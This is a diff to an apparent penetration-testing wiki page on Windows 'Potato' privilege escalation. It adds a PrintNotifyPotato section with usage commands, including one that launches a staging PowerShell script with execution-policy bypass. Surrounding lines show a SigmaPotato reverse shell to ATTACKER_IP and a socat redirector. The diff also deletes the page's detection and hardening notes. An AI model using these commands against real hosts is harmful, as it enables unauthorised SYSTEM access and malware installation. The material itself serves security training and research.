@@ -84,6 +84,25 @@ socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
 RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
 ```
 
+### PrintNotifyPotato
+
+PrintNotifyPotato is a newer COM abuse primitive released in late 2022 that targets the **PrintNotify** service instead of Spooler/BITS. The binary instantiates the PrintNotify COM server, swaps in a fake `IUnknown`, then triggers a privileged callback through `CreatePointerMoniker`. When the PrintNotify service (running as **SYSTEM**) connects back, the process duplicates the returned token and spawns the supplied payload with full privileges.
+
+Key operational notes:
+
+* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
+* Requires the calling context to hold **SeImpersonatePrivilege** (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts).
+* Accepts either a direct command or an interactive mode so you can stay inside the original console. Example:
+
+  ```cmd
+  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
+  PrintNotifyPotato.exe whoami
+  ```
+
+* Because it is purely COM-based, no named-pipe listeners or external redirectors are required, making it a drop-in replacement on hosts where Defender blocks RoguePotato’s RPC binding.
+
+Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.
+
 ### SharpEfsPotato
 
 ```bash
@@ -169,14 +188,6 @@ SigmaPotato adds modern niceties like in-memory execution via .NET reflection an
 [SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
 ```
 
-## Detection and hardening notes
-
-- Monitor for processes creating named pipes and immediately calling token-duplication APIs followed by CreateProcessAsUser/CreateProcessWithTokenW. Sysmon can surface useful telemetry: Event ID 1 (process creation), 17/18 (named pipe created/connected), and command lines spawning child processes as SYSTEM.
-- Spooler hardening: Disabling the Print Spooler service on servers where it isn’t needed prevents PrintSpoofer-style local coercions via spoolss.
-- Service account hardening: Minimize assignment of SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege to custom services. Consider running services under virtual accounts with least privileges required and isolating them with service SID and write-restricted tokens when possible.
-- Network controls: Blocking outbound TCP/135 or restricting RPC endpoint mapper traffic can break RoguePotato unless an internal redirector is available.
-- EDR/AV: All of these tools are widely signatured. Recompiling from source, renaming symbols/strings, or using in-memory execution can reduce detection but won’t defeat solid behavioral detections.
-
 ## References
 
 - [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
@@ -190,5 +201,7 @@ SigmaPotato adds modern niceties like in-memory execution via .NET reflection an
 - [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
 - [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
 - [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
+- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
+- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 
 {{#include ../../banners/hacktricks-training.md}}
